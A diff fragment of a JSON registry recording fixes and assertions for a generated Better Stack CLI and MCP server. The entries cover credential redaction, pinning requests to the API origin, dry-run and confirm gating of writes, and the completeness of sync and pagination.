+     "not_contains": "cached for five minutes"
+    },
+    {
+     "file": "SKILL.md",
+     "not_contains": "cached for five minutes"
+    },
+    {
+     "file": "README.md",
+     "contains": "[credkit: withheld from stdout: it carried a credential this program holds]"
+    },
+    {
+     "file": "SKILL.md",
+     "contains": "[credkit: withheld from stdout: it carried a credential this program holds]"
+    },
+    {
+     "file": "README.md",
+     "not_contains": "text withheld: it repeated a secret value"
+    },
+    {
+     "file": "SKILL.md",
+     "not_contains": "text withheld: it repeated a secret value"
+    }
+   ]
+  },
+  {
+   "id": "dry-run-sends-nothing",
+   "status": "active",
+   "summary": "A client built under --dry-run refuses every request at its transport, so no write can reach Better Stack whatever a command does with the client.",
+   "why": "Defense in depth: the generated preview path returns before sending, and this transport makes a missed branch fail closed. The black-box test runs writes under --dry-run from a cold start against a fake API host and counts zero requests.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/betterstack_guard.go",
+     "contains": "inner = dryRunTripper{}",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/betterstackblackbox/blackbox_test.go",
+     "contains": "func TestDryRunSendsNothing(t *testing.T) {",
+     "code_only": true
+    }
+   ],
+   "class": "write-safety"
+  },
+  {
+   "id": "mcp-endpoint-write-confirm",
+   "status": "active",
+   "summary": "Every typed MCP endpoint tool that is not read-only (every create, update and delete tool, incidents_acknowledge, incidents_resolve) returns a preview of the request and sends nothing until confirm is boolean true; the gate wraps every non-read-only, non-mirrored tool, so one a later print adds is gated too. A preview shows a credential-named argument (a monitor's auth_password or request_headers) as [redacted] (previewArguments, cliutil.RedactSecretFields), so the kit does not withhold the whole preview.",
+   "why": "Work order connector note: every MCP write must preview and send only with confirm: true. Press 4.34.2's in-process endpoint handlers (makeAPIHandler) send writes directly. The gate (hand file internal/mcp/betterstack_endpoint_confirm.go) is installed by one anchored line in the generated tools.go after every registration and before the read-only drop. The black-box test drives the real MCP server against a fake Better Stack: no write without confirm, the string \"true\" previews, and boolean true sends (control).",
+   "asserts": [
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "contains": "RequireConfirmForEndpointWrites(s)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/betterstack_endpoint_confirm.go",
+     "contains": "func RequireConfirmForEndpointWrites(s *server.MCPServer) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/betterstack_confirm_registered_test.go",
+     "contains": "func TestRegisteredMirroredWritesNeedConfirm(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/betterstackblackbox/blackbox_test.go",
+     "contains": "func TestMCPSendsOnlyReadsWithoutConfirm(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/betterstackblackbox/blackbox_test.go",
+     "contains": "func TestMCPWriteSendsOnlyWithConfirmTrue(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/betterstack_endpoint_confirm.go",
+     "contains": "\"arguments\":             previewArguments(rest),",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/betterstack_endpoint_confirm.go",
+     "contains": "func previewArguments(args any) any {",
+     "code_only": true
+    }
+   ],
+   "class": "write-safety"
+  },
+  {
+   "id": "config-file-holds-no-credential",
+   "status": "active",
+   "summary": "A config rewrite adds no credential to config.toml: config.toml keeps its own base_url, never BETTERSTACK_BASE_URL's (configForSave), so a userinfo password or query credential in BETTERSTACK_BASE_URL never lands in the file; a saved token goes to the 0600 credential store. config.toml and the store are credential SOURCES (orchestrator ruling 7): written outside the kit through cliutil.AtomicWriteCredentialFile, named in Declarations.Files and held whole on every read and write.",
+   "why": "Codex r1 class credential-persisted-outside-the-store: `BETTERSTACK_BASE_URL='https://uptime.betterstack.com/api/v2?api_key=X' auth set-token` wrote X (and a userinfo password) into config.toml, because the generated save persists base_url as configured. The old persistence filter (betterstack_persist.go) is retired with the old layer; the source-side fix is that a rewrite keeps the file's own values. TestP1ConfigRewriteAddsNoCopyOfTheURLPassword covers the environment password beside a [headers] value; TestConfigFileNeverHoldsACredential (black box) the query credential.",
+   "asserts": [
+    {
+     "file": "cli/internal/config/config.go",
+     "contains": "if c.envOverrides[\"BaseURL\"] {\n\t\t\tout.BaseURL = c.fileConfig.BaseURL\n\t\t}",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/config.go",
+     "contains": "cfg.markEnvOverride(\"BaseURL\")",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/betterstackblackbox/config_file_test.go",
+     "contains": "func TestConfigFileNeverHoldsACredential(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/leak_test.go",
+     "contains": "func TestP1ConfigRewriteAddsNoCopyOfTheURLPassword(t *testing.T) {",
+     "code_only": true
+    }
+   ],
+   "class": "credential-kit"
+  },
+  {
+   "id": "export-file-closed-on-error",
+   "status": "active",
+   "summary": "export --output closes its output file (written through the kit's credkit.NewWriter) on every return, including an API error: the open no longer shadows RunE's named err",
+   "why": "The generated `f, err := openExportOutput(...)` inside the --output block declared a new err, so the deferred close tested that inner (nil) err and never ran when the export returned an API error. Under the retired output filter the unclosed file was a pipe that kept the process from exiting (`export monitors --output f.jsonl` after a 401 hung; TestExportOutputReturnsAfterAnAPIError); the kit's writer is closed on the same path.",
+   "asserts": [
+    {
+     "file": "cli/internal/betterstackblackbox/export_test.go",
+     "contains": "func TestExportOutputReturnsAfterAnAPIError(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/export.go",
+     "contains": "f, ferr := openExportOutput(outputFile)",
+     "code_only": true
+    }
+   ],
+   "class": "error-path"
+  },
+  {
+   "id": "api-origin-pinned",
+   "status": "active",
+   "summary": "The Authorization bearer token and every API request go only to the scheme, host and port of the configured base URL (https://uptime.betterstack.com/api/v2, or BETTERSTACK_BASE_URL); every redirect hop must stay on that origin, a non-ASCII host never matches, and an unparseable base URL pins nothing (every request refused). Installed on every CLI, novel and MCP client by registerClientHook (internal/cli/betterstack_guard.go), with the response cache off and --dry-run clients refusing every send",
+   "why": "Credential rule host pinning: the generated client sends the Authorization header to whatever URL it is handed and its CheckRedirect strips only the named auth headers, so a Location to another host or an absolute path from an MCP argument would carry the token off the vendor API. One origin, taken from the configured base URL; an operator who sets BETTERSTACK_BASE_URL moves the pin with it. The pin runs before the kit's transport (client.OutboundGuard), which holds every credential a response carries; the pin itself holds nothing.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/betterstack_guard.go",
+     "contains": "func checkPin(pin string, req *http.Request) error {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/betterstack_guard.go",
+     "contains": "if o := normalizedOrigin(req.URL); o == \"\" || o != pin {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/betterstack_guard.go",
+     "contains": "hc.Transport = originPinTripper{pin: pin, next: inner}",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/betterstack_guard.go",
+     "contains": "registerClientHook(func(c *client.Client) error {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/betterstack_guard.go",
+     "contains": "if u, err := url.Parse(c.BaseURL); err == nil {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/betterstack_cred_rules_test.go",
+     "contains": "func TestPinAllowsOnlyTheAPIOrigin(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/betterstack_cred_rules_test.go",
+     "contains": "func TestPinFollowsTheConfiguredBaseURL(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/betterstack_guard.go",
+     "contains": "next = credkit.Transport(nil)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/betterstack_guard.go",
+     "not_contains": "responseHoldTripper"
+    }
+   ],
+   "class": "credential-origin"
+  },
+  {
+   "id": "doctor-real-host",
+   "status": "active",
+   "summary": "doctorShippedBaseURL is empty: Better Stack's shipped base URL (https://uptime.betterstack.com/api/v2) is its one real API root, so doctor probes it instead of reporting every healthy install as an unconfigured placeholder",
+   "why": "press-traps s5: the fleet doctor replay restored doctor_verdict.go with doctorShippedBaseURL = \"https://uptime.betterstack.com/api/v2\", so doctor printed \"not configured (base_url is a placeholder)\" and skipped the credential probe on every correctly configured install. TestDoctorProbesTheRealBetterstackHost was seen failing on the replayed file (seen/doctor-real-host-seen-failing.log). A fleet re-mint of the doctor template would restore the placeholder value: keep this entry. (betterstack 4.34.2 reprint)",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/doctor_verdict.go",
+     "contains": "const doctorShippedBaseURL = \"\"",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor_real_host_test.go",
+     "contains": "func TestDoctorProbesTheRealBetterstackHost(t *testing.T) {",
+     "code_only": true
+    }
+   ],
+   "class": "doctor-truth"
+  },
+  {
+   "id": "spec-names-pinned",
+   "status": "active",
+   "summary": "The credential-name rule and the kit's declarations are pinned against Better Stack's own spec in both directions: of every spec name exactly the Authorization carrier and an escalation policy's incident_token read as credentials, and the declared ResponseFields, CredentialFields and MCPArguments are incident_token plus the monitor credentials the API documents outside spec.yaml (auth_username, auth_password, request_headers, in every separator spelling), none of which is a spec name. The names live in internal/cliutil/testdata/betterstack-spec-names.json (the published module ships no spec) and are checked against spec.yaml when it sits beside the module",
+   "why": "press-traps s2 (salesbuildr -> backup-radar): a spec-name guard that read spec.json silently skipped on this spec.yaml connector. Pinned names cannot skip.",
+   "asserts": [
+    {
+     "file": "cli/internal/cliutil/testdata/betterstack-spec-names.json",
+     "contains": "\"incident_token\""
+    },
+    {
+     "file": "cli/internal/cliutil/spec_names_test.go",
+     "contains": "func TestNoBetterstackSpecNameReadsAsACredential(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/spec_names_test.go",
+     "contains": "want := map[string]bool{\"Authorization\": true, \"incident_token\": true}",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/leak_test.go",
+     "contains": "func TestDeclarationsMatchTheSpec(t *testing.T) {",
+     "code_only": true
+    }
+   ],
+   "class": "credential-kit"
+  },
+  {
+   "id": "novels-refuse-partial-store",
+   "status": "active",
+   "summary": "Every novel loader (monitors, heartbeats, incidents, on-calls, status pages, groups) refuses a resource whose rows are not backed by a finished, unfiltered sync: a sync that stopped part way, rows a live read wrote through with no sync, a resource never synced while others were, or a filtered walk; never synced and empty keeps the empty result with its sync hint",
+   "why": "Class incomplete-snapshot-read-as-complete: fleet, down, coverage, triage and the rest read the local mirror as the whole account, so a `sync --max-pages 1`, a write-through read or `sync --resources incidents --param resolved=true` made them report no monitors down or no unacked incidents. Tests seen failing first (seen/incomplete-snapshot-seen-failing.log). The sync wrapper records filtered walks by parameter NAME only (betterstack_sync_scope.go). (betterstack 4.34.2 reprint)",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/betterstack_snapshot.go",
+     "contains": "func requireFinishedSync(s *store.Store, resourceType string) error {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/betterstack_snapshot.go",
+     "contains": "params, filtered, err := syncWalkFiltered(s, resourceType)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/betterstack_snapshot.go",
+     "contains": "was never synced, so this report would read it as empty",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/analytics.go",
+     "contains": "if err := requireFinishedSync(s, ",
+     "code_only": true,
+     "min_count": 4
+    },
+    {
+     "file": "cli/internal/cli/novel_loaders.go",
+     "contains": "if err := requireFinishedSync(s, ",
+     "code_only": true,
+     "min_count": 3
+    },
+    {
+     "file": "cli/internal/cli/betterstack_sync_scope.go",
+     "contains": "func wrapSyncScope(cmd *cobra.Command, flags *rootFlags) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/betterstack_sync_scope.go",
+     "contains": "if complete != 1 || !synced.Valid || synced.String == \"\" {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/betterstack_snapshot_test.go",
+     "contains": "func TestNovelsRefuseAPartialSnapshot(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/betterstack_snapshot_test.go",
+     "contains": "func TestFilteredSyncIsNotASnapshot(t *testing.T) {",
+     "code_only": true
+    }
+   ],
+   "class": "incomplete-snapshot-read-as-complete"
+  },
+  {
+   "id": "statuspage-audit-all-fetches-failed",
+   "status": "active",
+   "summary": "statuspage-audit fails (naming the first error) when every live GET /status-pages/{id}/resources fetch failed, and reports first_error beside fetch_failures when some did, instead of printing \"No status-page drift found\" with exit 0",
+   "why": "Class all-fetches-failed-read-as-zero (press-traps s3): with every live fetch failing (a 401, a 5xx), nothing was audited live and the command still answered no drift. Test seen failing first (seen/all-fetches-failed-seen-failing.log). (betterstack 4.34.2 reprint)",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/statuspage_audit.go",
+     "contains": "if len(rep.FetchFailures) == len(pages) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/statuspage_audit.go",
+     "contains": "FirstError    string              `json:\"first_error,omitempty\"`",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/betterstack_fanout_test.go",
+     "contains": "func TestStatuspageAuditFailsWhenEveryLiveFetchFailed(t *testing.T) {",
+     "code_only": true
+    }
+   ],
+   "class": "wrong-result"
+  },
+  {
+   "id": "spec-path-param-examples",
+   "status": "upstreamed",
+   "summary": "spec.yaml gives every path parameter an example (`example: \"2085431\"`, status_page_id `\"184620\"`), so the 4.34.2 render emits a runnable Example on every get, update, delete, acknowledge and resolve command",
+   "why": "press-traps s1: 4.34.0+ emits only runnable examples; a command whose path params carry no example gets none, and dogfood's example coverage fails. 30 params (tools/spec_fix.py). Spec-encoded: survives every reprint from this spec. (betterstack 4.34.2 reprint)",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/monitors_get.go",
+     "contains": "betterstack-cli monitors get 2085431",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/status-page-sections_get.go",
+     "contains": "betterstack-cli status-page-sections get 184620 2085431",
+     "code_only": true
+    }
+   ],
+   "class": "docs-accuracy"
+  },
+  {
+   "id": "dead-query-param-helpers-removed",
+   "status": "active",
+   "summary": "helpers.go: the generator's retainCLIQueryParams/retainExplicitQueryParams are removed; no betterstack command calls them",
+   "why": "The 4.34.2 dogfood dead-function gate fails shipcheck on them (2 dead). tools/apply_edits.py re-applies the removal on every render (the same removal autotask's 4.34.2 reprint made). (betterstack 4.34.2 reprint)",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/helpers.go",
+     "not_contains": "func retainCLIQueryParams("
+    },
+    {
+     "file": "cli/internal/cli/helpers.go",
+     "not_contains": "func retainExplicitQueryParams("
+    }
+   ],
+   "class": "dead-code"
+  },
+  {
+   "id": "novel-attribute-paths-not-hosts",
+   "status": "active",
+   "summary": "The novel loaders read JSON:API attributes through ja(\"<name>\") (json_extract of attributes.<name>), never a dotted literal such as \"attributes.email\"",
+   "why": "The 4.34.2 dogfood novel-host gate read 26 json_extract paths (attributes.email, attributes.name, attributes.call: .email, .name and .call are gTLDs) as unverified hosts and failed shipcheck. A reprint that restores the dotted literals fails the gate again. (betterstack 4.34.2 reprint)",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/analytics.go",
+     "contains": "func ja(name string) string {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/analytics.go",
+     "not_contains": "jx(\"attributes."
+    },
+    {
+     "file": "cli/internal/cli/novel_loaders.go",
+     "not_contains": "jx(\"attributes."
+    }
+   ],
+   "class": "wrong-result"
+  },
+  {
+   "id": "credential-named-by-sibling-member",
+   "status": "active",
+   "summary": "A monitor's request_headers (name and value pairs whose values carry the probed site's own credentials, an Authorization or X-Api-Key header among them) is a declared credential container: the kit holds every value beneath it in a response, a request body and an MCP argument, and the store and an MCP preview mask the whole list (credentialContainerNames). A header under a name that is no credential's (X-Tenant) is held too: the kit reads no sibling member.",
+   "why": "Class credential-named-by-sibling-member, found by the black box on Better Stack's documented monitor request_headers shape: the value sat under `value`, a name no rule reads as a credential, and printed in every output mode and over MCP and landed in the store, export.jsonl, deliver.json and learnings.jsonl. The old layer's pair rule is retired with it; the declaration over-holds the container's non-credential values (a P2 cost, .review/followups.md).",
+   "asserts": [
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "\"request_headers\"",
+     "code_only": true,
+     "min_count": 3
+    },
+    {
+     "file": "cli/internal/cliutil/secret_fields.go",
+     "contains": "\"requestheaders\": true,",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/leak_test.go",
+     "contains": "func TestMonitorCredentialsNeverPrint(t *testing.T) {",
+     "code_only": true
+    }
+   ],
+   "class": "credential-kit"
+  },
+  {
+   "id": "export-walks-every-page",
+   "status": "active",
+   "summary": "export (CLI and the MCP export tool) walks every page: each resourceReadConfigs entry pages with page / per_page instead of declaring no pagination",
+   "why": "Wrong result on Better Stack's documented paging (page / per_page lists, pagination.next): the 4.34.2 render gave every read config no pagination, so export wrote the first page only (50 of 130 records in the black box), silently, exit 0, to a file documented as a backup. sync pages correctly (its own pager). tools/apply_edits.py re-applies the edit on every render; the durable home is a `pagination:` block (type page, cursor_param page, limit_param per_page) on each list endpoint in spec.yaml. Seen failing: seen/export-first-page-only-seen-failing.log, seen/export-first-page-only-seen-failing-main.log. (betterstack 4.34.2 reprint)",
+   "spec_encode_followup": "Add `pagination: {type: page, cursor_param: page, limit_param: per_page}` to each list endpoint in spec.yaml so resource_paths.go renders paged read configs by construction.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/resource_paths.go",
+     "contains": "{responsePath: \"data\", paginationType: \"page\", cursorParam: \"page\", limitParam: \"per_page\", pageSize: 100},",
+     "code_only": true,
+     "min_count": 8
+    },
+    {
+     "file": "cli/internal/cli/resource_paths.go",
+     "not_contains": "{responsePath: \"data\", pageSize: 100},"
+    },
+    {
+     "file": "cli/internal/betterstackblackbox/export_test.go",
+     "contains": "func TestExportWalksEveryPage(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/betterstackblackbox/export_test.go",
+     "not_contains": "BETTERSTACK_BB_EXPORT_PAGES"
+    }
+   ],
+   "class": "incomplete-snapshot-read-as-complete"
+  },
+  {
+   "id": "r1-credential-pair-identity-unheld",
+   "status": "active",
+   "summary": "A monitor's basic-auth username is a credential: auth_username is a declared CredentialField, ResponseField and MCPArgument in every separator spelling (auth_username, authUsername, auth_user, authUser; the kit compares names ignoring case, so AUTHUSER and authuser are authUser), so the kit holds it before any sink; the one secret-name rule (credentialIdentityName) reads the same names so the store and an MCP preview mask it. Names that only mention users (on_call_users, user_id, last_login_at) stay visible.",
+   "why": "Codex r1 [P1] holder incomplete: Better Stack's documented monitor auth_username (beside auth_password) matched no credential rule, so `monitors get --data-source live --json` printed it. Print-review P1 input (open after the r1 fix): the same value under AUTHUSER. TestP1PairIdentityInAnyCaseNeverPrints runs that input on the built binary against a TLS fake and was seen failing on the pre-kit build.",
+   "asserts": [
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "\"authUser\"",
+     "code_only": true,
+     "min_count": 3
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "\"auth_username\"",
+     "code_only": true,
+     "min_count": 3
+    },
+    {
+     "file": "cli/internal/cliutil/secret_fields.go",
+     "contains": "func credentialIdentityName(n string) bool {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/leak_test.go",
+     "contains": "func TestP1PairIdentityInAnyCaseNeverPrints(t *testing.T) {",
+     "code_only": true
+    }
+   ],
+   "class": "credential-kit"
+  },
+  {
+   "id": "r1-command-line-config-unheld-at-startup",
+   "status": "active",
+   "summary": "Every config file any --config on the command line names is held inside credkit.Start, before any output (credentialFiles: holdOnly(runFiles(cfg)) for each), so a config the parser never reached cannot print in an unknown-command or flag error.",
+   "why": "Codex r1 [P1] alternate-config credentials unheld: the startup holder loaded only BETTERSTACK_CONFIG or the default path, so `betterstack-cli <token> --config alt.toml` printed alt.toml's api_token in its unknown-command error. MCP cannot reach the read (betterstack-mcp has no --config and refuses one). The old startup holder is retired with the old layer; TestBsR1CommandLineConfigIsHeldBeforeParse (black box) and TestMalformedConfigNeverPrintsAtStartup run on the built binaries.",
+   "asserts": [
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "configs := credkit.FlagValues(args, \"--config\")",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "holdOnly(runFiles(cfg))",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/betterstackblackbox/bs_r1_test.go",
+     "contains": "func TestBsR1CommandLineConfigIsHeldBeforeParse(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/leak_test.go",
+     "contains": "func TestMalformedConfigNeverPrintsAtStartup(t *testing.T) {",
+     "code_only": true
+    }
+   ],
+   "class": "credential-kit"
+  },
+  {
+   "id": "r1-time-filtered-walk-read-as-complete",
+   "status": "active",
+   "summary": "Every plain sync is a full walk (no incremental from= window on GET /incidents), and a walk that sends --since, --latest-only or --full=false is recorded as not a snapshot, so the novels refuse it instead of reading a time window as the whole account. Every walk (sync, auto-refresh, workflow archive) passes one door, syncResource in betterstack_sync_scope.go, and auto-refresh is itself a whole walk",
+   "why": "Codex r1 [P1] filtered incident snapshot read as complete (a new instance of the pre-closed class incomplete-snapshot-read-as-complete): `sync --since 7d` sent from=<date> (spec.yaml resources.incidents.endpoints.list.params[from]) and every later plain sync sent from=<last sync>, so an incident open since before the window was never stored and one stored open was never seen resolved; triage reported both wrong. The scope record is an allowlist (only a full, reconciling, unparameterized walk is a snapshot). Codex review round 1 (betterstack 4.34.2 reprint); test seen failing first on the round-1 code: seen/r1-time-filtered-walk-read-as-complete-seen-failing.log. Codex round 2 reopened the class: auto-refresh (and workflow archive) called the generated walk directly, around the record on the sync command, so a refresh with from=<last sync> saved a complete checkpoint and triage kept a resolved incident open. The generated walk is renamed syncResourceWalk so no caller can go around the door, and a re-render that restores the old name fails the build. Auto-refresh walks the whole resource: recording its old one-page walk as partial would have made every novel refuse once an hour. TestAutoRefreshNeverKeepsAResolvedIncidentOpen and TestEveryWalkShapeIsRecordedWhereTheWalkRuns were seen failing first.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/betterstack_sync_scope.go",
+     "contains": "_ = f.Value.Set(\"true\")",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/betterstack_sync_scope.go",
+     "contains": "reasons = append(reasons, \"--since (\"+p+\")\")",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/betterstack_sync_scope.go",
+     "contains": "\"--full=false (an incremental walk that keeps deleted records)\"",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/betterstack_bs_r1_test.go",
+     "contains": "func TestBsR1TimeFilteredSyncIsNotASnapshot(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "func syncResourceWalk(ctx context.Context, c interface {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/betterstack_sync_scope.go",
+     "contains": "func syncResource(ctx context.Context, c interface {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/betterstack_sync_scope.go",
+     "contains": "reasons := walkNotWhole(resource, sinceTS, full, latestOnly, prune, userParams)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/auto_refresh.go",
+     "contains": "result := syncResource(ctx, c, db, resource, \"\", true, 0, false, true, nil, os.Stderr)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/betterstack_walk_scope_test.go",
+     "contains": "func TestAutoRefreshNeverKeepsAResolvedIncidentOpen(t *testing.T) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/betterstack_walk_scope_test.go",
+     "contains": "func TestEveryWalkShapeIsRecordedWhereTheWalkRuns(t *testing.T) {",
+     "code_only": true
+    }
+   ],
+   "class": "wrong-result"
+  },
+  {
+   "id": "r1-deleted-rows-read-as-current",
+   "status": "active",
+   "summary": "Every default sync resource reconciles deletions (flatReconcileModes flat_global, re-applied by tools/apply_edits.py), so a complete full walk removes records Better Stack no longer returns; a walk that cannot reconcile (--no-prune, a resource with no reconcile mode) is not a snapshot",
+   "why": "Codex r1 [P1] deleted rows read as current: the render left flatReconcileModes empty, so no sync removed a deleted monitor (--full included: reconcile_skipped unsupported-resource-shape) and fleet reported it down after a successful full sync (spec.yaml resources.monitors.endpoints.list). Codex review round 1 (betterstack 4.34.2 reprint); test seen failing first on the round-1 code: seen/r1-deleted-rows-read-as-current-seen-failing.log.",
+   "spec_encode_followup": "Have the press classify single-tenant JSON:API list resources as flat_global so sync.go renders flatReconcileModes filled by construction.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "var flatReconcileModes = map[string]string{",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "\"flat_global\",",
+     "code_only": true,
+     "min_count": 8
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "not_contains": "var flatReconcileModes = map[string]string{}"
+    },
+    {
+     "file": "cli/internal/cli/betterstack_sync_scope.go",
+     "contains": "\"no deletion reconcile for \"+resource",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/betterstack_sync_scope.go",
+     "contains": "\"--no-prune (deleted records kept)\"",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/betterstack_bs_r1_test.go",
+     "contains": "func TestBsR1DeletedRecordsLeaveTheStore(t *testing.T) {",
+     "code_only": true
+    }
+   ],
+   "class": "incomplete-snapshot-read-as-complete"
+  },
+  {
+   "id": "r1-heartbeat-incidents-omitted",
+   "status": "active",
+   "summary": "An incident's source is read typed by one shared reader (relationships.monitor / relationships.heartbeat, then attributes monitor_id / heartbeat_id): group-health counts heartbeat incidents on their heartbeat group, statuspage-audit audits heartbeat entries (missing, paused, operational with an open incident), down names the open incidents its monitor board does not list, and flapping / mttr --by-monitor key a heartbeat's incidents heartbeat:<id>, never by name",
+   "why": "Codex r1 [P1] heartbeat incidents omitted from group health: incidents were joined to monitors only (spec.yaml types.Incident.fields heartbeat_id, types.Heartbeat.fields heartbeat_group_id), so a heartbeat group with an open incident reported open_incidents 0; the same class skipped heartbeat entries in statuspage-audit and let down say there were no open incidents. Codex review round 1 (betterstack 4.34.2 reprint); test seen failing first on the round-1 code: seen/r1-heartbeat-incidents-omitted-seen-failing.log.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/analytics.go",
+     "contains": "func incidentSourceID(kind string) string {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/analytics.go",
+     "contains": "incidentSourceID(\"monitor\"), incidentSourceID(\"heartbeat\"))",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/analytics.go",
+     "contains": "\"NULLIF('heartbeat:'||\" + incidentSourceID(\"heartbeat\") + \",'heartbeat:'),\" +",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/novel_loaders.go",
+     "contains": "func indexOpenIncidents(incidents []incidentRow) openIncidents {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/group_health.go",
+     "contains": "row.OpenIncidents += len(idx.byHeartbeat[h.ID])",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/statuspage_audit.go",
+     "contains": "case strings.EqualFold(e.Type, \"Heartbeat\"):",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/down.go",
+     "contains": "OtherOpen int `json:\"open_incidents_not_listed\"`",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/betterstack_bs_r1_test.go",
+     "contains": "func TestBsR1HeartbeatIncidentsAreCounted(t *testing.T) {",
+     "code_only": true
+    }
+   ],
+   "class": "wrong-result"
+  },
+  {
+   "id": "r1-incomplete-paging-read-as-complete",
+   "status": "active",
+   "summary": "statuspage-audit reads every page of GET /status-pages/{id}/resources (page / per_page 250) until pagination.next is null; a page that fails, does not parse, names a next page while empty, or a walk past 1000 pages fails that page's fetch instead of auditing part of it",
+   "why": "Codex r1 [P1] incomplete paging read as complete (a new instance of the pre-closed class export-first-page-only): one page was read, so a status page whose 251st resource was a paused monitor reported `No status-page drift found ... (live check: ok)` (spec.yaml resources.status-page-resources.endpoints.list, pagination.next on page 1). Codex review round 1 (betterstack 4.34.2 reprint); test seen failing first on the round-1 code: seen/r1-incomplete-paging-read-as-complete-seen-failing.log.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/statuspage_audit.go",
+     "contains": "func fetchPageResources(ctx context.Context, c *client.Client, pageID string) ([]pageResourceEntry, error) {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/statuspage_audit.go",
+     "contains": "map[string]string{\"page\": strconv.Itoa(page), \"per_page\": \"250\"}",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/statuspage_audit.go",
+     "contains": "if len(entries) > 0 && page > 1 && entries[0].ID == prevFirst {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/statuspage_audit.go",
+     "not_contains": "only the first page of resources was audited"
+    },
+    {
+     "file": "cli/internal/cli/betterstack_bs_r1_test.go",
+     "contains": "func TestBsR1StatuspageAuditWalksEveryResourcePage(t *testing.T) {",
+     "code_only": true
+    }
+   ],
+   "class": "incomplete-snapshot-read-as-complete"
   },
   {
    "id": "chatgpt-desktop-local-web-unsupported",
@@ -546,7 +1111,532 @@
      "file": "page.json",
      "not_contains": "connects only to remote"
     }
+   ],
+   "class": "docs-accuracy"
+  },
+  {
+   "id": "credkit-wiring",
+   "class": "credential-kit",
+   "status": "active",
